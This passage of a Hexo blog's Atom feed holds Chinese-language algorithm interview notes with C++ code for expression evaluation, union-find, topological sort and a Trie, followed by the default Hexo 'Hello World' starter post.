class="line">&#125;</span><br><span class="line">bool isOperater(char a)</span><br><span class="line">&#123;</span><br><span class="line">    return a==&#x27;+&#x27;||a==&#x27;-&#x27;||a==&#x27;*&#x27;||a==&#x27;/&#x27;;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">vector&lt;string&gt; getans(string s)</span><br><span class="line">&#123;</span><br><span class="line">    stack&lt;char&gt; sta;</span><br><span class="line">    vector&lt;string&gt; ans;</span><br><span class="line">    int i=0;</span><br><span class="line">    while(i&lt;s.size())</span><br><span class="line">    &#123;</span><br><span class="line">        if(s[i]==&#x27;(&#x27;)</span><br><span class="line">        &#123;</span><br><span class="line">            sta.push(s[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        else if(isOperater(s[i]))</span><br><span class="line">        &#123;</span><br><span class="line">            if( !sta.empty() &amp;&amp; isPrior(s[i],sta.top()) )</span><br><span class="line">            &#123;</span><br><span class="line">                while(!sta.empty())</span><br><span class="line">                &#123;</span><br><span class="line">                    ans.push_back(string(1,sta.top()));</span><br><span class="line">                    sta.pop();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            sta.push(s[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        else if(s[i]==&#x27;)&#x27;)</span><br><span class="line">        &#123;</span><br><span class="line">            while(sta.top()!=&#x27;(&#x27;)</span><br><span class="line">            &#123;</span><br><span class="line">                ans.push_back(string(1,sta.top()));</span><br><span class="line">                sta.pop();</span><br><span class="line">            &#125;</span><br><span class="line">            sta.pop();</span><br><span class="line">        &#125;</span><br><span class="line">        else if(isdigit(s[i]))</span><br><span class="line">        &#123;</span><br><span class="line">            int num=0;</span><br><span class="line">            while(isdigit(s[i]))</span><br><span class="line">            &#123;</span><br><span class="line">                num=10*num+(s[i]-&#x27;0&#x27;);</span><br><span class="line">                i++;</span><br><span class="line">            &#125;</span><br><span class="line">            i--;</span><br><span class="line">          ans.push_back(to_string(num)); </span><br><span class="line">        &#125;</span><br><span class="line">        i++;</span><br><span class="line">    &#125;</span><br><span class="line">    while(!sta.empty())</span><br><span class="line">    &#123;</span><br><span class="line">        ans.push_back(string(1,sta.top()));</span><br><span class="line">        sta.pop();</span><br><span class="line">    &#125;</span><br><span class="line">    return ans;</span><br><span class="line">&#125;</span><br><span class="line">int getnum(vector&lt;string&gt; s)</span><br><span class="line">&#123;</span><br><span class="line">    </span><br><span class="line">    stack&lt;string&gt; sta;</span><br><span class="line">    int i=0;</span><br><span class="line">    int num=0;</span><br><span class="line">    while(i&lt;s.size())</span><br><span class="line">    &#123;</span><br><span class="line">        if(s[i]==&quot;+&quot;)</span><br><span class="line">        &#123;</span><br><span class="line">            num=0;</span><br><span class="line">            int r=stoi(sta.top());</span><br><span class="line">            sta.pop();</span><br><span class="line">            int l=stoi(sta.top());</span><br><span class="line">            sta.pop();</span><br><span class="line">            sta.push(to_string(l+r));</span><br><span class="line">        &#125;</span><br><span class="line">        else if(s[i]==&quot;-&quot;)</span><br><span class="line">        &#123;</span><br><span class="line">            num=0;</span><br><span class="line">            int r=stoi(sta.top());</span><br><span class="line">            sta.pop();</span><br><span class="line">            int l=stoi(sta.top());</span><br><span class="line">            sta.pop();</span><br><span class="line">            sta.push(to_string(l-r));</span><br><span class="line">        &#125;</span><br><span class="line">        else if(s[i]==&quot;*&quot;)</span><br><span class="line">        &#123;</span><br><span class="line">            num=0;</span><br><span class="line">            int r=stoi(sta.top());</span><br><span class="line">            sta.pop();</span><br><span class="line">            int l=stoi(sta.top());</span><br><span class="line">            sta.pop();</span><br><span class="line">            sta.push(to_string(l*r));</span><br><span class="line">        &#125;</span><br><span class="line">        else if(s[i]==&quot;/&quot;)</span><br><span class="line">        &#123;</span><br><span class="line">            num=0;</span><br><span class="line">            int r=stoi(sta.top());</span><br><span class="line">            sta.pop();</span><br><span class="line">            int l=stoi(sta.top());</span><br><span class="line">            sta.pop();</span><br><span class="line">            sta.push(to_string(l/r));</span><br><span class="line">        &#125;</span><br><span class="line">        else</span><br><span class="line">        &#123;</span><br><span class="line">            sta.push(s[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        i++;</span><br><span class="line">    &#125;</span><br><span class="line">    return stoi(sta.top());</span><br><span class="line">&#125; </span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    string s=&quot;10-(5+2)*2+1&quot;;</span><br><span class="line">    vector&lt;string&gt; ans=getans(s);</span><br><span class="line">    int res=getnum(ans);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;bits/stdc++.h&gt;</span><br><span class="line">#include&lt;iostream&gt;</span><br><span class="line">using namespace std;</span><br><span class="line">bool isSign(char a)</span><br><span class="line">&#123;</span><br><span class="line">    return a==&#x27;@&#x27;||a==&#x27;x&#x27;||a==&#x27;+&#x27;;</span><br><span class="line">&#125;</span><br><span class="line">bool isPriority(char a,char b)</span><br><span class="line">&#123;</span><br><span class="line">    if(a==&#x27;+&#x27;)</span><br><span class="line">    &#123;</span><br><span class="line">        return b==&#x27;@&#x27;||b==&#x27;x&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">    if(a==&#x27;x&#x27;)</span><br><span class="line">    &#123;</span><br><span class="line">        return b==&#x27;@&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">    return false;</span><br><span class="line">&#125;</span><br><span class="line">bool isEqual(char a,char b)</span><br><span class="line">&#123;</span><br><span class="line">    return a==b;</span><br><span class="line">&#125;</span><br><span class="line">vector&lt;string&gt; getReversePoland(string&amp; s)</span><br><span class="line">&#123;</span><br><span class="line">    stack&lt;char&gt; sta;</span><br><span class="line">    vector&lt;string&gt; ans;</span><br><span class="line">    int i=0;</span><br><span class="line">    int n=s.size();</span><br><span class="line">    while(i&lt;n)</span><br><span class="line">    &#123;</span><br><span class="line">        if(isdigit(s[i]))</span><br><span class="line">        &#123;</span><br><span class="line">            long long num=0;</span><br><span class="line">            while(i&lt;n&amp;&amp;isdigit(s[i]))</span><br><span class="line">            &#123;</span><br><span class="line">                num=num*10+(s[i]-&#x27;0&#x27;);</span><br><span class="line">                i++;</span><br><span class="line">            &#125;</span><br><span class="line">            i--;</span><br><span class="line">            ans.push_back(to_string(num));</span><br><span class="line">        &#125;</span><br><span class="line">        else if(isSign(s[i]))</span><br><span class="line">        &#123;</span><br><span class="line">            while(!sta.empty()&amp;&amp; ( isPriority(s[i],sta.top()) || isEqual(s[i],sta.top()) ) )</span><br><span class="line">            &#123;</span><br><span class="line">                    ans.push_back(string(1,sta.top()));</span><br><span class="line">                    sta.pop();</span><br><span class="line">            &#125;</span><br><span class="line">            sta.push(s[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        i++;</span><br><span class="line">    &#125;</span><br><span class="line">    while(!sta.empty())</span><br><span class="line">    &#123;</span><br><span class="line">        ans.push_back(string(1,sta.top()));</span><br><span class="line">        sta.pop();</span><br><span class="line">    &#125;</span><br><span class="line">    return ans;</span><br><span class="line">&#125;</span><br><span class="line">long long getans(string&amp; s)</span><br><span class="line">&#123;</span><br><span class="line">    vector&lt;string&gt; input=getReversePoland(s);</span><br><span class="line">    stack&lt;long long&gt; sta;</span><br><span class="line">    for(int i=0;i&lt;input.size();i++)</span><br><span class="line">    &#123;</span><br><span class="line">        if(isSign(input[i][0]))</span><br><span class="line">        &#123;</span><br><span class="line">            long long r=sta.top();</span><br><span class="line">            sta.pop();</span><br><span class="line">            long long l=sta.top();</span><br><span class="line">            sta.pop();</span><br><span class="line">            switch(input[i][0])</span><br><span class="line">            &#123;</span><br><span class="line">                case &#x27;@&#x27;:</span><br><span class="line">                    sta.push(l|(l+r));</span><br><span class="line">                    break;</span><br><span class="line">                case &#x27;x&#x27;:</span><br><span class="line">                    sta.push(l*r);</span><br><span class="line">                    break;</span><br><span class="line">                case &#x27;+&#x27;:</span><br><span class="line">                    sta.push(l+r);</span><br><span class="line">                    break;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        else</span><br><span class="line">        &#123;</span><br><span class="line">            sta.push(stoll(input[i]));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return sta.top();</span><br><span class="line">&#125;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    string input;</span><br><span class="line">    cin&gt;&gt;input;</span><br><span class="line">    cout&lt;&lt;getans(input)&lt;&lt;endl;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="17-并查集union-find"><a href="#17-并查集union-find" class="headerlink" title="17.并查集union find"></a>17.并查集union find</h1><p>解决连接问题：找两个点是是否连接在一起，网络中节点间的连接状态</p><p>连接问题</p><p>求并集+查找集合</p><p><img src="C:\Users\zx\AppData\Roaming\Typora\typora-user-images\image-20210917182133508.png" alt="image-20210917182133508"></p><p>基于rank优化+路径压缩</p><p><img src="C:\Users\zx\AppData\Roaming\Typora\typora-user-images\image-20210917214811456.png" alt="image-20210917214811456"></p><p><img src="C:\Users\zx\AppData\Roaming\Typora\typora-user-images\image-20210917215707765.png" alt="image-20210917215707765"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;iostream&gt;</span><br><span class="line">#include&lt;bits/stdc++.h&gt;</span><br><span class="line">using namespace std;</span><br><span class="line">class union_find</span><br><span class="line">&#123;</span><br><span class="line">private:</span><br><span class="line">    int* parent;</span><br><span class="line">    int* rank;//sz[i]为以i为根的集合元素个数</span><br><span class="line">    int count;</span><br><span class="line">public:</span><br><span class="line">    union_find(int n)</span><br><span class="line">    &#123;</span><br><span class="line">        int count=n;</span><br><span class="line">        parent=new int[n];</span><br><span class="line">        rank=new int[n];</span><br><span class="line">        for(int i=0;i&lt;n;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            parent[i]=i;</span><br><span class="line">            rank[i]=1;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    ~union_find()</span><br><span class="line">    &#123;</span><br><span class="line">        delete[] parent;</span><br><span class="line">        delete[] rank;</span><br><span class="line">    &#125;</span><br><span class="line">    int find(int p)</span><br><span class="line">    &#123;</span><br><span class="line">        assert(p&gt;=0&amp;&amp;p&lt;=count);</span><br><span class="line">/*         while(p!=parent[p])</span><br><span class="line">        &#123;</span><br><span class="line">            parent[p]=parent[parent[p]];</span><br><span class="line">            p=parent[p];</span><br><span class="line">        &#125;</span><br><span class="line">        return parent[p]; */</span><br><span class="line">        if(p!=parent[p])</span><br><span class="line">        &#123;</span><br><span class="line">            parent[p]=find(parent[p]);</span><br><span class="line">        &#125;</span><br><span class="line">        return parent[p];</span><br><span class="line">    &#125;</span><br><span class="line">    bool isConnect(int p,int q)</span><br><span class="line">    &#123;</span><br><span class="line">        return find(p)==find(q);</span><br><span class="line">    &#125;</span><br><span class="line">    void unionEle(int p,int q)</span><br><span class="line">    &#123;</span><br><span class="line">        int pRoot=find(p);</span><br><span class="line">        int qRoot=find(q);</span><br><span class="line">        if(qRoot==pRoot)</span><br><span class="line">        &#123;</span><br><span class="line">            return;</span><br><span class="line">        &#125;</span><br><span class="line">        if(rank[pRoot]&lt;rank[qRoot])</span><br><span class="line">        &#123;</span><br><span class="line">            parent[pRoot]=qRoot;</span><br><span class="line">        &#125;</span><br><span class="line">        else if(rank[pRoot]&gt;rank[qRoot])</span><br><span class="line">        &#123;</span><br><span class="line">            parent[qRoot]=pRoot;           </span><br><span class="line">        &#125;</span><br><span class="line">        else</span><br><span class="line">        &#123;</span><br><span class="line">            parent[pRoot]=qRoot;</span><br><span class="line">            rank[qRoot]+=1;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="18-拓扑排序"><a href="#18-拓扑排序" class="headerlink" title="18.拓扑排序"></a>18.拓扑排序</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">基于bfs的kahn算法</span><br><span class="line">1.初始化邻接矩阵和入度矩阵</span><br><span class="line">2.使用queue维护入度为0的队列，找入口</span><br><span class="line">3.BFS拓扑排序：从queue中BFS，终点入度减少，入度为0加入queue，直到queue为空</span><br></pre></td></tr></table></figure><p>思路：基于有向无环图，维护一个入度为0的队列，每次找出入度为0的节点取出来，同时该节点指向的节点的入度要–，减为0时，将该节点入队，直到que为空</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">bool canFinish(int numCourses, vector&lt;vector&lt;int&gt;&gt;&amp; prerequisites) &#123;</span><br><span class="line">    int n=prerequisites.size();</span><br><span class="line">    vector&lt;vector&lt;int&gt;&gt; adj(numCourses);</span><br><span class="line">    vector&lt;int&gt; indegree(numCourses);</span><br><span class="line">    //初始化了邻接表和入度表</span><br><span class="line">    for(int i=0;i&lt;n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        adj[prerequisites[i].back()].emplace_back(prerequisites[i].front());</span><br><span class="line">        indegree[prerequisites[i].front()]++;</span><br><span class="line">    &#125;</span><br><span class="line">    queue&lt;int&gt; que;</span><br><span class="line">    //找入口</span><br><span class="line">    for(int i=0;i&lt;numCourses;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        if(indegree[i]==0)</span><br><span class="line">        &#123;</span><br><span class="line">            que.push(i);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    int count=0;</span><br><span class="line">    //BFS拓扑排序</span><br><span class="line">    while(!que.empty())</span><br><span class="line">    &#123;</span><br><span class="line">        int front=que.front();</span><br><span class="line">        que.pop();</span><br><span class="line">        count++;</span><br><span class="line">        for(int j=0;j&lt;adj[front].size();j++)</span><br><span class="line">        &#123;</span><br><span class="line">            indegree[adj[front][j]]--;</span><br><span class="line">            if(indegree[adj[front][j]]==0)</span><br><span class="line">            &#123;</span><br><span class="line">                que.push(adj[front][j]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    return count==numCourses;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="19-前缀树-trie树"><a href="#19-前缀树-trie树" class="headerlink" title="19.前缀树(trie树)"></a>19.前缀树(trie树)</h1><p>![](D:\OneDrive - 东南大学\面试准备\算法\image\prefixTree.png)</p><p>![Trie_use](D:\OneDrive - 东南大学\面试准备\算法\image\Trie_use.png)</p><p>Trie树实现</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line">class TrieNode&#123;</span><br><span class="line">public:</span><br><span class="line">    char val;</span><br><span class="line">    bool isEnd;</span><br><span class="line">    TrieNode* children[26];</span><br><span class="line">public:</span><br><span class="line">    TrieNode()&#123;</span><br><span class="line">        for(int i=0;i&lt;26;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            children[i]=nullptr;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    TrieNode(char tmp)</span><br><span class="line">    &#123;</span><br><span class="line">        val=tmp;</span><br><span class="line">        isEnd=false;</span><br><span class="line">        for(int i=0;i&lt;26;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            children[i]=nullptr;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    TrieNode(char tmp,bool end)</span><br><span class="line">    &#123;</span><br><span class="line">        val=tmp;</span><br><span class="line">        isEnd=end;</span><br><span class="line">        for(int i=0;i&lt;26;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            children[i]=nullptr;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line">class Trie &#123;</span><br><span class="line">private:</span><br><span class="line">        TrieNode* root;</span><br><span class="line">public:</span><br><span class="line">    Trie() &#123;</span><br><span class="line">        root=new TrieNode();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    void insert(string word) &#123;</span><br><span class="line">        TrieNode* node=root;</span><br><span class="line">        for(auto c:word)</span><br><span class="line">        &#123;</span><br><span class="line">            if(node-&gt;children[c-&#x27;a&#x27;]==nullptr)</span><br><span class="line">            &#123;</span><br><span class="line">                node-&gt;children[c-&#x27;a&#x27;]=new TrieNode(c);</span><br><span class="line">            &#125;</span><br><span class="line">            node=node-&gt;children[c-&#x27;a&#x27;];</span><br><span class="line">        &#125;</span><br><span class="line">        node-&gt;isEnd=true;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    bool search(string word) &#123;</span><br><span class="line">        TrieNode* node=root;</span><br><span class="line">        for(auto c:word)</span><br><span class="line">        &#123;</span><br><span class="line">            if(node-&gt;children[c-&#x27;a&#x27;]==nullptr)</span><br><span class="line">            &#123;</span><br><span class="line">                return false;</span><br><span class="line">            &#125;</span><br><span class="line">            node=node-&gt;children[c-&#x27;a&#x27;];</span><br><span class="line">        &#125;</span><br><span class="line">        return node-&gt;isEnd;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    bool startsWith(string prefix) &#123;</span><br><span class="line">        TrieNode* node=root;</span><br><span class="line">        for(auto c:prefix)</span><br><span class="line">        &#123;</span><br><span class="line">            if(node-&gt;children[c-&#x27;a&#x27;]==nullptr)</span><br><span class="line">            &#123;</span><br><span class="line">                return false;</span><br><span class="line">            &#125;</span><br><span class="line">            node=node-&gt;children[c-&#x27;a&#x27;];</span><br><span class="line">        &#125;   </span><br><span class="line">        return true;     </span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * Your Trie object will be instantiated and called as such:</span><br><span class="line"> * Trie* obj = new Trie();</span><br><span class="line"> * obj-&gt;insert(word);</span><br><span class="line"> * bool param_2 = obj-&gt;search(word);</span><br><span class="line"> * bool param_3 = obj-&gt;startsWith(prefix);</span><br><span class="line"> */</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;1-排序算法&quot;&gt;&lt;a href=&quot;#1-排序算法&quot; class=&quot;headerlink&quot; title=&quot;1.排序算法&quot;&gt;&lt;/a&gt;1.排序算法&lt;/h1&gt;&lt;p&gt;&lt;img src=&quot;https://images2017.cnblogs.com/blog/1282720/</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Hello World</title>
    <link href="https://zengxiang21.github.io/2021/11/16/hello-world/"/>
    <id>https://zengxiang21.github.io/2021/11/16/hello-world/</id>
    <published>2021-11-16T08:24:35.752Z</published>
    <updated>2021-10-27T06:18:18.000Z</updated>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Welcome to &lt;a href=&quot;https://hexo.io/&quot;&gt;Hexo&lt;/a&gt;! This is your very first post. Check &lt;a href=&quot;https://hexo.io/docs/&quot;&gt;documentation&lt;/a&gt; for</summary>
      
    
    
    
    
  </entry>
  
</feed>
